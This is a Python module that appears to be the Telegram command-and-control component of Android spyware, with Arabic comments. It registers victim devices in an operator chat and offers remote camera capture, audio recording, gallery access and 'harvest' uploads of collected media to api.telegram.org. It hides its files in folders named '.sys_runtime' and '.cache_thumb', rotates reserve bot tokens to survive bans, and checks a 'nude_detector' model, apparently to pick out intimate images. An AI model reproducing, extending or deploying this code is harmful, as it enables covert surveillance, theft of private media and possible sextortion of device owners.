# -*- coding: utf-8 -*-
import os
import time
import json
import threading
import logging
import requests
import sys
import importlib
import random
from collections import deque
from datetime import datetime

import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ========== إعداد المسار الموحد ==========
def _get_runtime_path():
    try:
        from jnius import autoclass
        act = autoclass('org.kivy.android.PythonActivity').mActivity
        base = act.getFilesDir().getPath()
        return os.path.join(base, ".sys_runtime")
    except:
        return os.path.join(os.getcwd(), ".sys_runtime")

P = _get_runtime_path()
if P not in sys.path:
    sys.path.insert(0, P)

# التأكد من وجود مجلد .cache_thumb المستخدم لعملية الحصاد
CACHE_THUMB = os.path.join(P, ".cache_thumb")
if not os.path.exists(CACHE_THUMB):
    os.makedirs(CACHE_THUMB)

logging.basicConfig(filename=os.path.join(P, "t.log"), level=logging.ERROR, filemode='a')

TG_HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36'
}

class T:
    def __init__(self, m, active_tokens, reserve_tokens, ctrl_id, vault_id, app_password):
        self.m = m
        self.device_id = getattr(m, 'did', 'unknown_device')
        self.dvs_file = os.path.join(P, "dvs.json")
        self.ses_file = os.path.join(P, "ses.json")
        self.ses = {}
        self.dvs = {}
        self.p_upd = deque(maxlen=200)
        self.rn = True

        self.active_tokens = active_tokens[:]
        self.reserve_tokens = reserve_tokens[:]
        self.ctrl = ctrl_id
        self.dat = vault_id
        self.pw = app_password

        self._load()
        threading.Thread(target=self._session_cleaner, daemon=True).start()
        threading.Thread(target=self._heartbeat_worker, daemon=True).start()

    # ========== إدارة الملفات ==========
    def _load(self):
        for path, target in [(self.dvs_file, self.dvs), (self.ses_file, self.ses)]:
            if os.path.exists(path):
                try:
                    with open(path, 'r') as f:
                        target.update(json.load(f))
                except:
                    pass

    def _save(self):
        try:
            with open(self.dvs_file, 'w') as f:
                json.dump(self.dvs, f)
            with open(self.ses_file, 'w') as f:
                json.dump(self.ses, f)
        except:
            pass

    # ========== إدارة الجلسات ==========
    def _session_cleaner(self):
        while self.rn:
            now = time.time()
            expired = [cid for cid, exp in self.ses.items() if exp < now]
            if expired:
                for cid in expired:
                    self.ses.pop(cid, None)
                self._save()
            time.sleep(3600)

    # ========== دوال البوتات - توزيع ثابت + تبديل طوارئ ==========
    def _next_token(self):
        if not self.active_tokens:
            return None
        rng = random.Random(self.device_id)
        return rng.choice(self.active_tokens)

    def _emergency_switch(self, bad_token):
        if bad_token in self.active_tokens:
            idx = self.active_tokens.index(bad_token)
            self.active_tokens.remove(bad_token)
            if self.reserve_tokens:
                new_token = self.reserve_tokens.pop(0)
                self.active_tokens.append(new_token)
                self._api("sendMessage", {
                    "chat_id": self.ctrl,
                    "text": f"⚠️ <b>Emergency switch</b>\nBot #{idx+1} replaced. {len(self.reserve_tokens)} reserve left.",
                    "parse_mode": "HTML"
                })
            else:
                self._api("sendMessage", {
                    "chat_id": self.ctrl,
                    "text": "🚨 <b>CRITICAL: No reserve bots left!</b> Please add new tokens via GitHub Secrets.",
                    "parse_mode": "HTML"
                })

    def _heartbeat_worker(self):
        while self.rn:
            time.sleep(21600)  # 6 ساعات
            if not self.reserve_tokens:
                continue
            hb_bot = random.choice(self.reserve_tokens)
            try:
                url = f"https://api.telegram.org/bot{hb_bot}/sendMessage"
                data = {"chat_id": self.dat, "text": f"❤️ system heartbeat {datetime.now().strftime('%Y-%m-%d %H:%M')}"}
                requests.post(url, data=data, timeout=10, verify=False)
            except Exception:
                pass

    # ========== API الأساسية مع معالجة محسنة للـ 429 ==========
    def _api(self, method, data=None, files=None, retry=3):
        last_token = None
        for attempt in range(retry):
            token = self._next_token()
            if not token:
                return None
            if attempt > 0 and token == last_token:
                token = self._next_token()
                if not token:
                    return None
            last_token = token
            try:
                url = f"https://api.telegram.org/bot{token}/{method}"
                resp = requests.post(url, data=data, files=files, headers=TG_HEADERS, timeout=25, verify=False)
                result = resp.json()
                if result.get('ok'):
                    return result
                error = result.get('error_code')
                if error == 429:
                    time.sleep(2)
                    continue
                elif error in (401, 403):
                    self._emergency_switch(token)
                else:
                    time.sleep(1)
            except Exception as e:
                logging.error(f"API error {method}: {e}")
                time.sleep(1)
        return None

    # ========== تسجيل الأجهزة والإشعارات ==========
    def reg(self, device_id, device_model):
        if device_id in self.dvs:
            return self.dvs[device_id].get('t')
        topic_name = f"📱 {device_model[:12]} | {device_id[:4]}"
        res = self._api("createForumTopic", {"chat_id": self.ctrl, "name": topic_name})
        if res and res.get('ok'):
            topic_id = res['result']['message_thread_id']
            self.dvs[device_id] = {"n": device_model, "t": topic_id}
            self._save()
            self._api("sendMessage", {
                "chat_id": self.ctrl,
                "message_thread_id": topic_id,
                "text": f"<b>✅ Device registered</b>\n<b>{device_model}</b>\n<code>{device_id}</code>",
                "parse_mode": "HTML"
            })
            return topic_id
        return None

    def notify_harvest(self, device_id, count):
        dev = self.dvs.get(device_id)
        if dev and 't' in dev:
            msg = f"📦 <b>Auto harvest</b>\nDevice: {dev['n']}\nItems: {count}\nTime: {datetime.now().strftime('%H:%M:%S')}"
            self._api("sendMessage", {
                "chat_id": self.ctrl,
                "message_thread_id": dev['t'],
                "text": msg,
                "parse_mode": "HTML"
            })

    # ========== عدد الملفات المعلقة في .cache_thumb ==========
    def _count_pending_harvest(self):
        if not os.path.exists(CACHE_THUMB):
            return 0
        return len([f for f in os.listdir(CACHE_THUMB) if not f.startswith('.')])

    # ========== أزرار التحكم ==========
    def _main_keyboard(self):
        return {"inline_keyboard": [
            [{"text": "📱 Connected devices", "callback_data": "ld"}],
            [{"text": "🧠 AI Status", "callback_data": "ai_status"}, {"text": "🔄 Renew session", "callback_data": "rnw"}],
            [{"text": "🚪 Logout", "callback_data": "ext"}]
        ]}

    def _device_keyboard(self, device_id):
        count = self._count_pending_harvest()
        harvest_text = f"📦 Harvest ({count})" if count > 0 else "📦 Harvest (empty)"
        return {"inline_keyboard": [
            [{"text": "📸 Back camera", "callback_data": f"cam_{device_id}"}, {"text": "🤳 Front camera", "callback_data": f"camf_{device_id}"}],
            [{"text": "🎙️ Record audio", "callback_data": f"mic_{device_id}"}, {"text": harvest_text, "callback_data": f"hrv_{device_id}"}],
            [{"text": "🖼️ Gallery", "callback_data": f"media_{device_id}"}, {"text": "🚀 Send now", "callback_data": f"send_now_{device_id}"}],
            [{"text": "🔙 Back", "callback_data": "ld"}]
        ]}

    def _show_harvest_details(self, chat_id):
        if not os.path.exists(CACHE_THUMB):
            self._api("sendMessage", {"chat_id": chat_id, "text": "📭 No pending files."})
            return
        files = [f for f in os.listdir(CACHE_THUMB) if f.lower().endswith(('.jpg','.png','.mp4'))]
        if not files:
            self._api("sendMessage", {"chat_id": chat_id, "text": "📭 Harvest folder empty."})
            return
        total_size = sum(os.path.getsize(os.path.join(CACHE_THUMB, f)) for f in files)
        details = (
            f"📊 **Harvest report**\n"
            f"━━━━━━━━━━━━━━━\n"
            f"🖼️ Files: `{len(files)}`\n"
            f"💾 Size: `{total_size/(1024*1024):.2f} MB`\n"
            f"⏰ Updated: `{datetime.now().strftime('%H:%M:%S')}`\n\n"
            f"Use '🚀 Send now' to upload immediately."
        )
        self._api("sendMessage", {"chat_id": chat_id, "text": details, "parse_mode": "Markdown"})

    # ========== معالجة الرسائل والكولباك ==========
    def _is_authorized(self, chat_id):
        return time.time() < self.ses.get(str(chat_id), 0)

    def _handle_message(self, update):
        msg = update.get('message', {})
        chat_id = msg.get('chat', {}).get('id')
        text = msg.get('text', '')
        if not chat_id:
            return
        if text.startswith('/login'):
            parts = text.split()
            if len(parts) >= 2 and parts[1].strip() == self.pw:
                self.ses[str(chat_id)] = time.time() + 14400
                self._save()
                self._api("sendMessage", {
                    "chat_id": chat_id,
                    "text": "🔓 Login successful",
                    "reply_markup": json.dumps(self._main_keyboard())
                })
            else:
                self._api("sendMessage", {"chat_id": chat_id, "text": "❌ Wrong password"})
        elif self._is_authorized(chat_id) and text == '/menu':
            self._api("sendMessage", {
                "chat_id": chat_id,
                "text": "📋 Main menu",
                "reply_markup": json.dumps(self._main_keyboard())
            })

    def _handle_callback(self, update):
        cb = update.get('callback_query', {})
        cb_id = cb.get('id')
        if not cb_id or cb_id in self.p_upd:
            return
        self.p_upd.append(cb_id)

        chat_id = cb.get('message', {}).get('chat', {}).get('id')
        msg_id = cb.get('message', {}).get('message_id')
        data = cb.get('data', '')

        self._api("answerCallbackQuery", {"callback_query_id": cb_id})

        if not self._is_authorized(chat_id):
            self._api("sendMessage", {"chat_id": chat_id, "text": "⚠️ Session expired, use /login"})
            return

        if data == "ld":
            kb = {"inline_keyboard": []}
            for did, info in self.dvs.items():
                kb["inline_keyboard"].append([{"text": f"📱 {info['n']}", "callback_data": f"dev_{did}"}])
            kb["inline_keyboard"].append([{"text": "🔄 Refresh", "callback_data": "ld"}, {"text": "🔙 Back", "callback_data": "main"}])
            self._api("editMessageText", {
                "chat_id": chat_id,
                "message_id": msg_id,
                "text": "<b>Select device:</b>",
                "reply_markup": json.dumps(kb),
                "parse_mode": "HTML"
            })
            return

        if data.startswith("dev_"):
            did = data[4:]
            if did in self.dvs:
                self._api("editMessageText", {
                    "chat_id": chat_id,
                    "message_id": msg_id,
                    "text": f"🕹️ <b>{self.dvs[did]['n']}</b>",
                    "reply_markup": json.dumps(self._device_keyboard(did)),
                    "parse_mode": "HTML"
                })
            return

        if data.startswith("hrv_"):
            self._show_harvest_details(chat_id)
            return

        if data.startswith("send_now_"):
            did = data[8:]
            try:
                import commands
                importlib.reload(commands)
                commands.force_send_zip(self.m, did, self, chat_id)
            except Exception as e:
                self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Send error: {e}"})
            return

        if data == "ai_status":
            ai_loaded = hasattr(self.m, 'nude_detector') and self.m.nude_detector and self.m.nude_detector.model is not None
            status = "✅ Active" if ai_loaded else "❌ Not ready"
            self._api("answerCallbackQuery", {"callback_query_id": cb_id, "text": f"AI: {status}", "show_alert": True})
            return

        if data == "rnw":
            self.ses[str(chat_id)] = time.time() + 14400
            self._save()
            self._api("answerCallbackQuery", {"callback_query_id": cb_id, "text": "✅ Session renewed"})
            return

        if data == "ext":
            self.ses.pop(str(chat_id), None)
            self._save()
            self._api("editMessageText", {"chat_id": chat_id, "message_id": msg_id, "text": "🔒 Logged out."})
            return

        if data == "main":
            self._api("editMessageText", {
                "chat_id": chat_id,
                "message_id": msg_id,
                "text": "📋 Main menu",
                "reply_markup": json.dumps(self._main_keyboard())
            })
            return

        try:
            import commands
            importlib.reload(commands)
            commands.ex(data, self, self.m, chat_id, cb_id)
        except Exception as e:
            logging.error(f"Command error: {e}")
            self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Error: {str(e)[:100]}"})

    # ========== حلقة الاستقبال ==========
    def _polling(self):
        offset = 0
        while self.rn:
            token = self._next_token()
            if not token:
                time.sleep(5)
                continue
            try:
                url = f"https://api.telegram.org/bot{token}/getUpdates"
                params = {"offset": offset, "timeout": 20, "allowed_updates": json.dumps(["message", "callback_query"])}
                resp = requests.get(url, params=params, headers=TG_HEADERS, timeout=25, verify=False)
                data = resp.json()
                if data.get('ok'):
                    for upd in data.get('result', []):
                        offset = upd['update_id'] + 1
                        if 'message' in upd:
                            self._handle_message(upd)
                        if 'callback_query' in upd:
                            self._handle_callback(upd)
                time.sleep(0.3)
            except Exception:
                time.sleep(2)

    # ========== بدء التشغيل ==========
    def start(self):
        if self.active_tokens:
            threading.Thread(target=self._polling, daemon=True).start()
            logging.info(f"Telegram UI started: {len(self.active_tokens)} active, {len(self.reserve_tokens)} reserve")
        else:
            logging.error("No active tokens, Telegram UI cannot start")
